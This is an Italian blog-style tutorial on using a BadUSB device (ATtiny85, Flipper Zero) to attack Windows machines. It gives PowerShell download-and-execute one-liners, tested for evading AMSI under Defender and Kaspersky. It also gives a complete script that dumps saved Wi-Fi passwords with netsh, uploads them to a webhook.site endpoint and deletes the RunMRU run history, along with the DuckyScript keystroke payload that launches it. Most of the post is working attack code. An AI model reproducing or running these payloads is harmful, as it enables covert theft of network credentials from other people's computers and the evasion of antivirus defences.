## Esfiltrazione delle chiavi wifi salvate in un computer e incidenti di percorso.

Visto che avevo un Attiny85 mi sono messo a giocare con badusb e sono ben presto caduto nelle grinfie del malefico AMSI (Antimalware Scan Interface), ho pensato quindi di scrivere due righe in base alla mia esperienza in merito
(*caveat emptor, non sono uno sviluppatore per cui non escludo errori in caso segnalatemelo*).

Gli stessi principi sono applicabili a Flipper Zero, USB Rubber ducky etc etc.

Quando un utente avvia uno script o inizializza un processo PowerShell (o PowerShell_ISE), viene caricata automaticamente la libreria AMSI.DLL che fornisce l’API necessaria per l’interazione con il software antivirus installato e predefinito. 
AMSI.DLL invia lo script o il comando all'antivirus prima dell’esecuzione, utilizzando una chiamata RPC; l'antivirus quindi analizza le informazioni ricevute e invia una risposta: se viene rilevata una firma nota, l’esecuzione viene interrotta e viene visualizzato un messaggio che indica che lo script è bloccato dal programma antivirus.

La funzionalità AMSI è integrata in questi componenti di Windows: 
- Controllo dell’account utente (elevazione di EXE, COM, MSI o installazione di ActiveX), 
- PowerShell (script, uso interattivo e valutazione dinamica del codice), 
- host script Windows (wscript.exe e cscript.exe), 
- JavaScript e VBScript, 
- Office macro VBA...

Ora, immaginiamo di voler eseguire uno script powershell remoto, caricato ad esempio su pastebin (un classico rickroll in questo caso).

Dai test che ho fatto:

```console
powershell -w h -NoP -NonI -ep Bypass -c iwr https://pastebin.com/raw/VGmUcTn6 | iex 
```

non funziona ma viene intercettato

```console
powershell -w h -NoP -NonI -ep Bypass -c iex ((iwr https://pastebin.com/raw/VGmUcTn6).content) 
```
non funziona ma viene intercettato

```console
powershell -w h -NoP -NonI -ep Bypass -c "iex (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/VGmUcTn6')"
```
**FUNZIONA!**

Testati:
- Microsoft Defender
- Kaspersky free
- more to come

Per maggiori dettagli fate riferimento a questo eccellente post:
https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/

Dalla KB di Kaspersky
https://support.kaspersky.com/KESWin/11.9.0/en-US/173854.htm

Soluzioni che interagiscono con AMSI:
https://github.com/subat0mik/whoamsi


Risolte le premessse, passiamo alla parte divertente, ovvero come estrarre le chiavi di autenticazione delle reti wifi salvate nel pc, tramite badusb.
Prima di tutto serve uno script powershell per estrarle:

```console
#credits to https://jocha.se/blog/tech/display-all-saved-wifi-passwords
#Extract WiFi network name and password, valid for Italian language systems, otherwise change that "Contenuto chiave"
netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenuto chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} |  Format-Table -autosize | Out-File "$env:temp\Output.txt"

#Upload to webhook selected site (replace with your own)
iwr -Uri https://webhook.site/xxxxxxx-xxxxxxxxxx-xxxxxx -Method POST -infile "$env:temp\Output.txt"

#Cleanup of downloaded file and recent run history
rm "$env:temp\Output.txt"
cd HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\
rm .\RunMRU
```

Lo script powershell va modificato come desiderato (nell'output), salvato e caricato come file.ps1 nel vostro hosting preferito o messo su pastebin, se preferite.

Lo script badusb da eseguire per richiamare il powershell che ho usato è banale (occhio se usate pastebin a copiare il link al raw o ovviamente non andrà nulla:

```console
DEFAULTDELAY 200
DELAY 1000
GUI R
STRING powershell -w h -NoP -NonI -ep Bypass -c "iex(New-Object Net.WebClient).DownloadString('https://url_dello_script_o_link_al_raw_su_pastebin')"
ENTER
```

Viene lanciato Win+R, scritto il comando nella casella esegui (in maniera visibile) e c'è una finestra di powershell che compare, 
**quindi non è pensato per essere stealth**, ma siccome il nostro scopo non è illegale, la cosa non ci interessa vero?

Per lo sketch da caricare sull'attiny85 usate il geniale servizio di spacehun, [duckify.huhn.me](https://duckify.huhn.me), lasciategli una donazione se lo usate, se lo merita.

Io ho solo aggiunto una riga giusto alla fine:

```console
digitalWrite(1, HIGH);  // Turn the LED On
```
per accendere il led rosso quando ha finito.

Testato su Windows 10 e 11 in Italiano.

Have fun.
